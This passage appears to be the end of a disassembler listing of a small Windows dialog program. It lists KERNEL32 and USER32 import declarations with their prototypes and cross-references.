		extrn SetConsoleCtrlHandler:dword ; CODE XREF: _signal+90p
					; DATA XREF: _signal+90r ...
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: _signal:loc_407FCDp
					; DATA XREF: _signal:loc_407FCDr ...
; UINT __stdcall GetOEMCP()
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
					; .text:00408644r
; UINT __stdcall GetACP()
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
					; .text:0040863Er
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; CODE XREF: __setmbcp+48p
					; _setSBUpLow+14p
					; DATA XREF: ...
; BOOL __stdcall IsBadCodePtr(FARPROC lpfn)
		extrn IsBadCodePtr:dword ; CODE	XREF: _ValidateExecute(int (*)(void))+8p
					; DATA XREF: _ValidateExecute(int (*)(void))+8r ...
; BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb)
		extrn IsBadReadPtr:dword ; CODE	XREF: _ValidateRead(void const *,uint)+Cp
					; DATA XREF: _ValidateRead(void	const *,uint)+Cr ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn SetUnhandledExceptionFilter:dword	; CODE XREF: sub_40776B+5p
					; sub_40777C+6p
					; DATA XREF: ...
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; CODE XREF: __ioinit+FFp
					; __ioinit+166p
					; DATA XREF: ...
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: __ioinit+158p
					; __NMSG_WRITE+143p
					; DATA XREF: ...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; CODE XREF:	__ioinit+19Dp
					; DATA XREF: __ioinit+19Dr ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn GetEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Bp
					; ___crtGetEnvironmentStringsA+5Bp
					; DATA XREF: ...
; LPCH __stdcall GetEnvironmentStrings()
		extrn GetEnvironmentStrings:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_406E79p
					; ___crtGetEnvironmentStringsA+E1p
					; DATA XREF: ...
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
		extrn GetStringTypeW:dword ; CODE XREF:	___crtGetStringTypeA+3Fp
					; ___crtGetStringTypeA+12Dp
					; DATA XREF: ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: _free+27p	.text:00404F7Fp ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: _realloc+F0p
					; ___sbh_alloc_new_region+28p
					; DATA XREF: ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: _realloc+AFp
					; __heap_alloc+2Ep ...
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: start+C2p
					; DATA XREF: start+C2r	...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: start+9Fp
					; __ioinit+59p
					; DATA XREF: ...
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: start+74p
					; DATA XREF: start+74r	...
; DWORD	__stdcall GetVersion()
		extrn GetVersion:dword	; CODE XREF: start+26p
					; DATA XREF: start+26r	...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: _fast_error_exit+1Dp
					; _doexit+91p
					; DATA XREF: ...
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; CODE XREF: __heap_init+2Fp
					; .text:00404FA5p
					; DATA XREF: ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword	; CODE XREF: __heap_init+11p
					; DATA XREF: __heap_init+11r ...
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: .text:00404F67p
					; .text:00404F72p ...
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: ___sbh_alloc_new_region+76p
					; ___sbh_alloc_new_group+51p
					; DATA XREF: ...
; BOOL __stdcall IsBadWritePtr(LPVOID lp, UINT_PTR ucb)
		extrn IsBadWritePtr:dword ; CODE XREF: ___sbh_heap_check+1Ep
					; ___sbh_heap_check+57p ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: _doexit+17p
					; DATA XREF: _doexit+17r ...
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: _doexit+10p
					; DATA XREF: _doexit+10r ...
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; CODE XREF: __XcptFilter+138p
					; DATA XREF: __XcptFilter+138r	...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn FreeEnvironmentStringsA:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+11Fp
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr	...
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn FreeEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+CEp
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr ...
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+93p
					; ___crtGetEnvironmentStringsA+B5p ...

;
; Imports from USER32.dll
;
; HICON	__stdcall LoadIconA(HINSTANCE hInstance, LPCSTR	lpIconName)
		extrn LoadIconA:dword	; CODE XREF: sub_4024F1+B8p
					; sub_4024F1+10Dp
					; DATA XREF: ...
; LRESULT __stdcall SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
		extrn SendMessageA:dword ; CODE	XREF: sub_4024F1+D5p
					; sub_4024F1+FFp ...
; BOOL __stdcall CheckDlgButton(HWND hDlg, int nIDButton, UINT uCheck)
		extrn CheckDlgButton:dword ; CODE XREF:	sub_4024F1+E3p
					; DATA XREF: sub_4024F1+E3r ...
; BOOL __stdcall SetWindowPos(HWND hWnd, HWND hWndInsertAfter, int X, int Y, int cx, int cy, UINT uFlags)
		extrn SetWindowPos:dword ; CODE	XREF: sub_4024F1+15Ep
					; DATA XREF: sub_4024F1+15Er ...
; BOOL __stdcall EndDialog(HWND	hDlg, INT_PTR nResult)
		extrn EndDialog:dword	; CODE XREF: sub_4024F1+16Fp
					; DATA XREF: sub_4024F1+16Fr ...
; int __stdcall	MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption,	UINT uType)
		extrn MessageBoxA:dword	; CODE XREF: sub_4024F1+1C0p
					; sub_4024F1+356p ...
; BOOL __stdcall GetCursorPos(LPPOINT lpPoint)
		extrn GetCursorPos:dword ; CODE	XREF: sub_4024F1+1FFp
					; sub_4024F1+262p ...
; BOOL __stdcall GetWindowRect(HWND hWnd, LPRECT lpRect)
		extrn GetWindowRect:dword ; CODE XREF: sub_4024F1+216p
					; sub_4024F1+279p ...
; BOOL __stdcall PtInRect(const	RECT *lprc, POINT pt)
		extrn PtInRect:dword	; CODE XREF: sub_4024F1+228p
					; sub_4024F1+28Bp ...
; HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName)
		extrn LoadCursorA:dword	; CODE XREF: sub_4024F1+239p
					; sub_4024F1+24Cp ...
; HCURSOR __stdcall SetCursor(HCURSOR hCursor)
		extrn SetCursor:dword	; CODE XREF: sub_4024F1+240p
					; sub_4024F1+253p ...
; UINT __stdcall IsDlgButtonChecked(HWND hDlg, int nIDButton)
		extrn IsDlgButtonChecked:dword ; CODE XREF: sub_4024F1+492p
					; DATA XREF: sub_4024F1+492r ...
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
		extrn GetDlgItem:dword	; CODE XREF: sub_401EF3+Dp
					; sub_401EF3+24p ...
; BOOL __stdcall EnableWindow(HWND hWnd, BOOL bEnable)
		extrn EnableWindow:dword ; CODE	XREF: sub_401EF3+14p
					; sub_401EF3+2Bp ...
; BOOL __stdcall DestroyWindow(HWND hWnd)
		extrn DestroyWindow:dword ; CODE XREF: sub_40114A+3Bp
					; sub_40114A+47p ...
; BOOL __stdcall SetDlgItemTextA(HWND hDlg, int	nIDDlgItem, LPCSTR lpString)
		extrn SetDlgItemTextA:dword ; CODE XREF: sub_40114A+5Dp
					; sub_4024F1+1DBp ...
; INT_PTR __stdcall DialogBoxParamA(HINSTANCE hInstance, LPCSTR	lpTemplateName,	HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam)
		extrn DialogBoxParamA:dword ; CODE XREF: .text:00401142p
					; .text:00402E1Cp
					; DATA XREF: ...



		end start
